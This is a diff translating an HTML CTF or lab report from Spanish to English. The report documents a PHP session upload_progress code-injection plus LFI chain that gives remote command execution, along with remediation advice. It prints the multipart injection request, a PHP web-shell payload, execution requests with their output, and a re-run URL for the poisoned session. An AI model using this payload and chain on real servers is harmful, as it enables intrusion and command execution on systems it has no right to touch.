@@ -238,53 +238,53 @@
       <span class="badge badge-ctf" style="font-size: 16px; padding: 8px 16px;">CTF</span>
     </div>
     <div class="cve-details">
-      <h1>PHP2Shell Chain A → RCE CONFIRMADO</h1>
+      <h1>PHP2Shell Chain A → RCE CONFIRMED</h1>
       <div class="cve-id">CVE-2026-109618 / CVE-2026-109619 — Session Deserialization</div>
       <div class="cve-desc">
-        Inyección de código PHP en fichero de sesión vía <code>session.upload_progress</code> + ejecución mediante LFI.
-        RCE confirmado como <code>www-data</code> (uid=33) en PHP 8.2.34 + nginx + PHP-FPM.
+        PHP code injection into session file via <code>session.upload_progress</code> + execution through LFI.
+        RCE confirmed as <code>www-data</code> (uid=33) on PHP 8.2.34 + nginx + PHP-FPM.
       </div>
     </div>
   </div>
 
   <div class="section">
-    <h2>1. Resumen Ejecutivo</h2>
+    <h2>1. Executive Summary</h2>
     <p>
-      Se reprodujo exitosamente la <strong>CADENA A de PHP2Shell</strong> (CVE-2026-109618 / CVE-2026-109619): 
-      inyección de código PHP en el fichero de sesión mediante <code>session.upload_progress</code> (el filename 
-      de un upload multipart se almacena crudo, sin validar) seguido de ejecución vía LFI en <code>/vuln.php</code>.
+      Successfully reproduced <strong>PHP2Shell Chain A</strong> (CVE-2026-109618 / CVE-2026-109619): 
+      PHP code injection into session file via <code>session.upload_progress</code> (multipart upload filename 
+      stored raw without validation) followed by execution through LFI in <code>/vuln.php</code>.
     </p>
     <div class="evidence-box">
-      <strong>PoC — Criterio de éxito:</strong>
+      <strong>PoC — Success Criteria:</strong>
       <pre><code>GET /vuln.php?page=/tmp/sessions/sess_ctfchainA00000000000000000000000&c=id</code></pre>
-      <strong>Salida:</strong>
+      <strong>Output:</strong>
       <pre><code>uid=33(www-data) gid=33(www-data) groups=33(www-data)
 RCE_OK</code></pre>
     </div>
     <p>
-      Se demostró ejecución arbitraria de comandos en el proceso php-fpm como usuario <code>www-data</code> (uid=33).
+      Demonstrated arbitrary command execution in php-fpm process as <code>www-data</code> user (uid=33).
     </p>
   </div>
 
   <div class="section">
-    <h2>2. Entorno Comprometido</h2>
+    <h2>2. Compromised Environment</h2>
     <table>
       <thead>
         <tr>
-          <th>Dato</th>
-          <th>Valor</th>
-          <th>Fuente</th>
+          <th>Item</th>
+          <th>Value</th>
+          <th>Source</th>
         </tr>
       </thead>
       <tbody>
         <tr>
-          <td>Servidor web</td>
+          <td>Web server</td>
           <td>nginx/1.31.7</td>
-          <td>Header Server</td>
+          <td>Server header</td>
         </tr>
         <tr>
           <td>PHP</td>
-          <td><strong>8.2.34</strong> (vulnerable; corregido en 8.2.35)</td>
+          <td><strong>8.2.34</strong> (vulnerable; fixed in 8.2.35)</td>
           <td>X-Powered-By + /index.php</td>
         </tr>
         <tr>
@@ -293,7 +293,7 @@ RCE_OK</code></pre>
           <td>/index.php</td>
         </tr>
         <tr>
-          <td>Sistema Operativo</td>
+          <td>Operating System</td>
           <td>Debian GNU/Linux 13 (trixie)</td>
           <td>RCE: head -3 /etc/os-release</td>
         </tr>
@@ -303,12 +303,12 @@ RCE_OK</code></pre>
           <td>RCE: uname -a</td>
         </tr>
         <tr>
-          <td>Hostname contenedor</td>
+          <td>Container hostname</td>
           <td>89e1a0c2bd7d</td>
           <td>LFI: page=/etc/hostname</td>
         </tr>
         <tr>
-          <td>Usuario proceso</td>
+          <td>Process user</td>
           <td><strong>www-data (uid=33, gid=33)</strong></td>
           <td>RCE: id / whoami</td>
         </tr>
@@ -317,17 +317,17 @@ RCE_OK</code></pre>
   </div>
 
   <div class="section">
-    <h2>3. Cadena de Ataque — Paso a Paso</h2>
+    <h2>3. Attack Chain — Step by Step</h2>
 
-    <h3>Paso 1 — Recon y Session Fixation</h3>
+    <h3>Step 1 — Recon and Session Fixation</h3>
     <ul>
-      <li>SID controlado: <code>ctfchainA00000000000000000000000</code> (32 caracteres)</li>
-      <li>Verificación: el servidor aceptó el SID vía cookie sin regenerarlo (sin Set-Cookie en respuesta)</li>
-      <li><code>session.save_path=/tmp/sessions</code> confirmado vía LFI (sess_&lt;SID&gt; existe)</li>
+      <li>Controlled SID: <code>ctfchainA00000000000000000000000</code> (32 characters)</li>
+      <li>Verification: server accepted SID via cookie without regeneration (no Set-Cookie in response)</li>
+      <li><code>session.save_path=/tmp/sessions</code> confirmed via LFI (sess_&lt;SID&gt; exists)</li>
     </ul>
 
-    <h3>Paso 2 — Disparo del Handler upload_progress + Inyección</h3>
-    <p><strong>Petición (POST multipart a /index.php):</strong></p>
+    <h3>Step 2 — Trigger upload_progress Handler + Injection</h3>
+    <p><strong>Request (POST multipart to /index.php):</strong></p>
     <pre><code>POST /index.php HTTP/1.1
 Cookie: PHPSESSID=ctfchainA00000000000000000000000
 Content-Type: multipart/form-data; boundary=----CTFCHAINBOUNDARY7d4a6e1c
@@ -346,40 +346,40 @@ Content-Type: application/octet-stream
 
 A
 ------CTFCHAINBOUNDARY7d4a6e1c--</code></pre>
-    <p><strong>Respuesta:</strong> <code>HTTP/1.1 200 OK</code> — body normal de index.php.</p>
+    <p><strong>Response:</strong> <code>HTTP/1.1 200 OK</code> — normal index.php body.</p>
     <p>
-      El handler escribió el filename crudo (con código PHP) en <code>/tmp/sessions/sess_&lt;SID&gt;</code>. 
-      Con <code>session.upload_progress.cleanup=Off</code>, el fichero persistió tras la request.
+      Handler wrote raw filename (with PHP code) to <code>/tmp/sessions/sess_&lt;SID&gt;</code>. 
+      With <code>session.upload_progress.cleanup=Off</code>, file persisted after request.
     </p>
 
-    <h3>Paso 3 — Verificación de Inyección + Ejecución vía LFI</h3>
-    <p><strong>Petición:</strong></p>
+    <h3>Step 3 — Injection Verification + Execution via LFI</h3>
+    <p><strong>Request:</strong></p>
     <pre><code>GET /vuln.php?page=/tmp/sessions/sess_ctfchainA00000000000000000000000</code></pre>
-    <p><strong>Respuesta (recortada):</strong></p>
+    <p><strong>Response (truncated):</strong></p>
     <pre><code>upload_progress_x|a:5:{s:10:"start_time";i:1792614809;...s:4:"name";s:43:"&lt;?php system($_GET['c']); echo 'RCE_OK'; ?&gt;"...
 Warning: Undefined array key "c" in /tmp/sessions/sess_ctfchainA00000000000000000000000 on line 1
 Fatal error: Uncaught ValueError: system(): Argument #1 ($command) cannot be empty
   #0 /tmp/sessions/sess_ctfchainA00000000000000000000000(1): system('')
   #1 /var/www/html/vuln.php(3): include('/tmp/sessions/s...')</code></pre>
     <p>
-      El stack trace demuestra la cadena completa: <strong>el código del filename se ejecutó dentro del include del LFI</strong>.
+      Stack trace proves complete chain: <strong>filename code executed inside LFI include</strong>.
     </p>
 
-    <h3>Paso 4 — RCE: Ejecución Arbitraria de Comandos</h3>
-    <p><strong>Petición:</strong></p>
+    <h3>Step 4 — RCE: Arbitrary Command Execution</h3>
+    <p><strong>Request:</strong></p>
     <pre><code>GET /vuln.php?page=/tmp/sessions/sess_ctfchainA00000000000000000000000&c=id</code></pre>
-    <p><strong>Respuesta:</strong></p>
+    <p><strong>Response:</strong></p>
     <pre><code>...s:4:"name";s:43:"uid=33(www-data) gid=33(www-data) groups=33(www-data)
 RCE_OK";s:8:"tmp_name";s:14:"/tmp/phpTKnYXy";...</code></pre>
   </div>
 
   <div class="section">
-    <h2>4. Evidencia de RCE — Comandos Ejecutados</h2>
+    <h2>4. RCE Evidence — Commands Executed</h2>
     <table>
       <thead>
         <tr>
-          <th>Comando (c=)</th>
-          <th>Salida Obtenida</th>
+          <th>Command (c=)</th>
+          <th>Output Obtained</th>
         </tr>
       </thead>
       <tbody>
@@ -404,69 +404,69 @@ RCE_OK";s:8:"tmp_name";s:14:"/tmp/phpTKnYXy";...</code></pre>
   </div>
 
   <div class="section">
-    <h2>5. Vulnerabilidad — Detalles Técnicos</h2>
+    <h2>5. Vulnerability — Technical Details</h2>
     <ul>
       <li><strong>CVE:</strong> CVE-2026-109618 / CVE-2026-109619 — PHP2Shell</li>
-      <li><strong>Versión afectada:</strong> PHP 8.2.34 (confirmada en target)</li>
-      <li><strong>Versión parcheada:</strong> PHP 8.2.35+, 8.3.24+, 8.4.6+</li>
+      <li><strong>Affected version:</strong> PHP 8.2.34 (confirmed on target)</li>
+      <li><strong>Patched version:</strong> PHP 8.2.35+, 8.3.24+, 8.4.6+</li>
       <li>
-        <strong>Mecanismo:</strong> El handler <code>session.upload_progress</code> (habilitado por defecto) 
-        almacena el filename del upload multipart crudo (sin sanitizar) en el fichero de sesión <code>sess_&lt;SID&gt;</code>. 
-        Si la aplicación incluye ese fichero (LFI), el código PHP se ejecuta.
+        <strong>Mechanism:</strong> The <code>session.upload_progress</code> handler (enabled by default) 
+        stores raw multipart upload filename (unsanitized) in session file <code>sess_&lt;SID&gt;</code>. 
+        If application includes that file (LFI), PHP code executes.
       </li>
       <li>
-        <strong>Condiciones habilitadoras en el lab:</strong>
+        <strong>Enabling conditions in lab:</strong>
         <ul>
           <li><code>session.upload_progress.enabled=On</code></li>
-          <li><code>session.upload_progress.cleanup=Off</code> (persistencia del payload)</li>
+          <li><code>session.upload_progress.cleanup=Off</code> (payload persistence)</li>
           <li><code>session.use_strict_mode=0</code> + <code>session.use_only_cookies=0</code> (session fixation)</li>
-          <li>LFI sin sanitizar en <code>/vuln.php</code> (<code>include($_GET['page'])</code>)</li>
-          <li><code>display_errors=On</code> (facilitó debugging, no necesario para la explotación)</li>
+          <li>Unsanitized LFI in <code>/vuln.php</code> (<code>include($_GET['page'])</code>)</li>
+          <li><code>display_errors=On</code> (aided debugging, not required for exploitation)</li>
         </ul>
       </li>
     </ul>
   </div>
 
   <div class="section">
-    <h2>6. Recomendaciones de Remediación</h2>
+    <h2>6. Remediation Recommendations</h2>
     <ol>
-      <li><strong>Actualizar PHP a 8.2.35+</strong> (parche oficial que corrige CVE-2026-109618/109619)</li>
-      <li><code>session.upload_progress.enabled=Off</code> si la aplicación no usa seguimiento de progreso de uploads</li>
-      <li><code>session.upload_progress.cleanup=On</code> (comportamiento seguro por defecto, evita persistencia)</li>
-      <li><code>session.use_strict_mode=1</code> y <code>session.use_only_cookies=1</code> (previene session fixation)</li>
+      <li><strong>Upgrade PHP to 8.2.35+</strong> (official patch fixing CVE-2026-109618/109619)</li>
+      <li><code>session.upload_progress.enabled=Off</code> if application doesn't use upload progress tracking</li>
+      <li><code>session.upload_progress.cleanup=On</code> (safe default behavior, prevents persistence)</li>
+      <li><code>session.use_strict_mode=1</code> and <code>session.use_only_cookies=1</code> (prevents session fixation)</li>
       <li>
-        <strong>Corregir el LFI en <code>/vuln.php</code>:</strong>
+        <strong>Fix LFI in <code>/vuln.php</code>:</strong>
         <ul>
-          <li>Implementar allowlist de ficheros incluibles</li>
-          <li>Rechazar wrappers peligrosos (php://, phar://, data://, ...)</li>
-          <li>Validar y normalizar paths con <code>realpath()</code> + prefijo obligatorio</li>
-          <li>Deshabilitar <code>display_errors</code> en producción</li>
+          <li>Implement allowlist for includable files</li>
+          <li>Reject dangerous wrappers (php://, phar://, data://, ...)</li>
+          <li>Validate and normalize paths with <code>realpath()</code> + mandatory prefix</li>
+          <li>Disable <code>display_errors</code> in production</li>
         </ul>
       </li>
     </ol>
   </div>
 
   <div class="section">
-    <h2>7. Store del Engagement</h2>
+    <h2>7. Engagement Store</h2>
     <p><strong>engagement_id:</strong> <code>ctf-php2shell-chainA</code></p>
-    <p><strong>Hallazgos registrados:</strong> 7 (todos <code>confirmed</code>, con evidencia reproducible)</p>
+    <p><strong>Findings registered:</strong> 7 (all <code>confirmed</code> with reproducible evidence)</p>
     <ol>
-      <li>Inicio de engagement</li>
-      <li>LFI confirmado en /vuln.php (MITRE ATT&CK: T1190 — Exploit Public-Facing Application)</li>
+      <li>Engagement start</li>
+      <li>LFI confirmed in /vuln.php (MITRE ATT&CK: T1190 — Exploit Public-Facing Application)</li>
       <li>save_path=/tmp/sessions + session fixation (T1078.004 — Valid Accounts: Cloud Accounts)</li>
       <li>PHP 8.2.34 + upload_progress=1 (T1592.004 — Gather Victim Host Information: Client Configurations)</li>
-      <li>Inyección de código PHP en fichero de sesión (T1505.003 — Server Software Component: Web Shell)</li>
-      <li>RCE confirmado — id como www-data uid=33 (T1059.004 — Command and Scripting Interpreter: Unix Shell)</li>
-      <li>RCE reforzado + cierre de engagement</li>
+      <li>PHP code injection into session file (T1505.003 — Server Software Component: Web Shell)</li>
+      <li>RCE confirmed — id as www-data uid=33 (T1059.004 — Command and Scripting Interpreter: Unix Shell)</li>
+      <li>RCE reinforced + engagement closure</li>
     </ol>
     <p>
-      <strong>Alcance respetado:</strong> Todas las peticiones se dirigieron exclusivamente a 
+      <strong>Scope respected:</strong> All requests exclusively targeted 
       <code>http://host.docker.internal:18080</code>.
     </p>
     <div class="evidence-box">
-      <strong>Persistencia del vector:</strong><br>
-      El SID envenenado <code>ctfchainA00000000000000000000000</code> sigue activo en el lab. 
-      El RCE puede re-ejecutarse con:
+      <strong>Vector persistence:</strong><br>
+      Poisoned SID <code>ctfchainA00000000000000000000000</code> remains active in lab. 
+      RCE can be re-executed with:
       <pre><code>GET /vuln.php?page=/tmp/sessions/sess_ctfchainA00000000000000000000000&c=&lt;comando&gt;</code></pre>
     </div>
   </div>
